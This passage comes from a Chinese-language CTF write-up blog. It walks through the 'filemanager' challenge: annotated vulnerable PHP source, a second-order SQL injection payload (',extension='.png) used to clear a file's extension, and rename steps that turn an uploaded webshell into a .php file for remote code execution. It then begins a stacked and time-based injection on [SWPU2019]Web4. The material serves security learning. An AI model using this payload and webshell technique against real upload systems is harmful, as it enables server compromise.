</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>就可以进行读取文件了，Burp抓包改一下文件名，再到show.php拿flag就行了：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200720185509.png" alt="image-20200720185509359"></p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200720185613.png" alt="image-20200720185613614"></p> <h3 id="filemanager"><a href="#filemanager" class="header-anchor">#</a> filemanager</h3> <p><strong>考点：</strong></p> <ul><li><strong>二次注入</strong></li></ul> <p><strong>另外，这个题目还纠正了我的一个误区：</strong></p> <ul><li><strong>经过addslashes()函数处理之后的字符串虽然本身关键字符被转义，但是存入数据库的时候回自动还原。</strong></li></ul> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token comment">//实例代码</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token comment">//此时$a本身字符串改变了，但是存入数据库的的时候回被自动还原成转义之前的状态</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p><strong>解题：</strong></p> <p>题目存在源码泄露，扫一下可以得到www.tar.gz</p> <p>拿到源码，其中关键代码如下(已做注释)：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>//upload.php

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">/**
 * Created by PhpStorm.
 * User: phithon
 * Date: 15/10/14
 * Time: 下午8:45
 */</span>

<span class="token keyword">require_once</span> <span class="token double-quoted-string string">&quot;common.inc.php&quot;</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;upfile&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;error&quot;</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">UPLOAD_ERR_OK</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;name&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$path_parts</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">//检查文件后缀名</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;extension&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;gif&quot;</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">&quot;jpg&quot;</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">&quot;png&quot;</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">&quot;zip&quot;</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">&quot;txt&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;error extension&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;extension&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;.&quot;</span> <span class="token punctuation">.</span> <span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;extension&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token comment">//修改后缀名为.{extension}</span>
		<span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;filename&quot;</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;extension&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

		<span class="token comment">// $path_parts[&quot;filename&quot;] = $db-&gt;quote($path_parts[&quot;filename&quot;]);</span>
		<span class="token comment">// Fix</span>
		
		<span class="token comment">//加转义符号</span>
		<span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">//{extension}白名单策略，文件名又经过转义函数处理。</span>
		<span class="token comment">//这里应该没有可以注入的地方</span>
		<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;select * from `file` where `filename`='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>' and `extension`='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>'&quot;</span><span class="token punctuation">;</span>
		
		<span class="token comment">//执行sql语句</span>
		<span class="token variable">$fetch</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">//根据查询的结果来判断文件是否存在</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">num_rows</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;file is exists&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token comment">//把临时文件移动到upload/{filename}目录下</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;tmp_name&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">UPLOAD_DIR</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token comment">//向数据库里插入信息</span>
			<span class="token comment">//insert into `file` (`filename`,`view`,`extension`) values('{filename}','0','{extension}')</span>
			<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;insert into `file` ( `filename`, `view`, `extension`) values( '<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>', 0, '<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>')&quot;</span><span class="token punctuation">;</span>
			<span class="token comment">//执行sql语句</span>
			<span class="token variable">$re</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$re</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">exit</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
			<span class="token comment">//显示上传的文件地址</span>
			<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;/&quot;</span> <span class="token punctuation">.</span> <span class="token constant">UPLOAD_DIR</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
			<span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;Your file is upload, url:
                &lt;a href=\&quot;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$url</span><span class="token punctuation">}</span></span>\&quot; target='_blank'&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$url</span><span class="token punctuation">}</span></span>&lt;/a&gt;&lt;br/&gt;
                &lt;a href=\&quot;/\&quot;&gt;go back&lt;/a&gt;&quot;</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
			<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;upload error&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

	<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
		<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">error_get_last</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">exit</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br></div></div><div class="language-php line-numbers-mode"><pre class="language-php"><code>//rename.php

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">/**
 * Created by PhpStorm.
 * User: phithon
 * Date: 15/10/14
 * Time: 下午9:39
 */</span>

<span class="token keyword">require_once</span> <span class="token double-quoted-string string">&quot;common.inc.php&quot;</span><span class="token punctuation">;</span>

<span class="token comment">//req['oldname'] = addslashes(value)</span>
<span class="token comment">//req['newname'] = addslashes(value)</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$req</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'oldname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$req</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'newname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;select * from `file` where `filename`='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$req</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'oldname'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>'&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">num_rows</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
		<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;old file doesn't exists!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

		<span class="token variable">$req</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'newname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$req</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'newname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">//向数据库中取出数据并没有经过函数处理，存在二次注入</span>
		<span class="token comment">//数据无法传入后缀名</span>
		<span class="token variable">$re</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;update `file` set `filename`='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$req</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'newname'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>', `oldname`='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>' where `fid`=<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'fid'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$re</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">exit</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token variable">$oldname</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_DIR</span> <span class="token punctuation">.</span> <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;filename&quot;</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;extension&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$newname</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_DIR</span> <span class="token punctuation">.</span> <span class="token variable">$req</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;newname&quot;</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;extension&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$oldname</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token comment">//重命名文件和目录</span>
			<span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$oldname</span><span class="token punctuation">,</span> <span class="token variable">$newname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;/&quot;</span> <span class="token punctuation">.</span> <span class="token variable">$newname</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;Your file is rename, url:
                &lt;a href=\&quot;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$url</span><span class="token punctuation">}</span></span>\&quot; target='_blank'&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$url</span><span class="token punctuation">}</span></span>&lt;/a&gt;&lt;br/&gt;
                &lt;a href=\&quot;/\&quot;&gt;go back&lt;/a&gt;&quot;</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>file manage<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>base</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>/<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>utf-8<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">&gt;</span></span>Rename<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>post<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span>old filename(exclude extension)：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>oldname<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span>new filename(exclude extension)：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>newname<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>rename<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br></div></div><p>upload.php中对传入数据库中字符做了转义处理，但是在rename.php中再次引用数据库中的数据的时候没有进行转义处理，引发了二次注入。</p> <p>上传webshell<code>',extension='.png</code>，在rename.php中进行重命名：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200727202706.png" alt="image-20200727202706692"></p> <p>这样经过拼接之后的sql语句为：</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">update</span> <span class="token punctuation">`</span><span class="token keyword">file</span><span class="token punctuation">`</span> <span class="token keyword">set</span> <span class="token punctuation">`</span>filename<span class="token punctuation">`</span><span class="token operator">=</span><span class="token string">'12png'</span><span class="token punctuation">,</span> <span class="token punctuation">`</span>oldname<span class="token punctuation">`</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span>extension<span class="token operator">=</span><span class="token string">''</span> <span class="token keyword">where</span> <span class="token punctuation">`</span>fid<span class="token punctuation">`</span> <span class="token operator">=</span> <span class="token punctuation">`</span>{fid}<span class="token punctuation">`</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>重命名成功，并将文件12png的extension字段置为空：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200727202941.png" alt="image-20200727202941339"></p> <p>此时如果再将12png重命名为12php，因为extension字段为空，所以newname=12php，看似可以写入一个Webshell，但是直接重命名只是修改了数据库中数据，并没有对文件做实质性的改动，也就是说，尽管数据库中的数据是12php，但是在上传目录下的文件名依然是12png，原因如下：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token comment">//rename.php</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$oldname</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token comment">//重命名文件和目录</span>
		<span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$oldname</span><span class="token punctuation">,</span> <span class="token variable">$newname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>只有满足$oldname存在，才可以进行实质性的文件重命名，也就是说还需要额外上传一个同名的Webshell，来满足这个if条件，在上传过程中并不会报<code>file is exists</code>的错误，具体原因如下：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>//upload.php

//将文件信息存入数据库的sql语句
$sql = &quot;insert into `file` ( `filename`, `view`, `extension`) values( '{$path_parts['filename']}', 0, '{$path_parts['extension']}')&quot;;

//我们上传12png，这个文件的extension会被解析为png，我们之前上传的文件extension字段已经被置位空，所以尽管两个文件的文件名相同，但是本质上并不重名。

//更直观一点，在数据表的字段信息分别为：

|fid|filename|oldname|view|extension|
| 1 |12png |       |  0 |         |
| 2 |123     |       |  0 |   png   |
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>这样一来，12png就可以被重命为12php，Webshell写入成功：</p> <img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200727204856.png" alt="image-20200727204856896"> <p>RCE随便打：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200727205545.png" alt="image-20200727205507754"></p> <h3 id="swpu2019-web4"><a href="#swpu2019-web4" class="header-anchor">#</a> [SWPU2019]Web4</h3> <p><strong>考点：</strong></p> <ul><li><strong>SQL注入（time based、堆叠注入）</strong></li> <li><strong>代码审计</strong></li></ul> <p>题目给了一个登录框，如果点击注册功能的话会弹窗注册功能未开放；如果随便输用户名点登录的话没有反应，抓包看看：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201004211419.png" alt="image-20201004205858933"></p> <p><code>username</code>和<code>password</code>是用json格式发送的，并且会返回一段信息。先测试有没有注入点：我在<code>username</code>后面添加了一个引号，引发了报错，但是这个报错是php的报错，不是Mysql的报错，所以无法进行报错注入</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201004211412.png" alt="image-20201004210120510"></p> <p>经过简单的手动fuzz之后发现没有办法进行联合查询（因为没有回显）和有Boolean回显的盲注，我猜可能是服务器全给WAF掉了，一般这种情况下可以考虑以下堆叠注入，所以我修改<code>username</code>为<code>123';</code>，结果发现回显正常：</p> <p><img 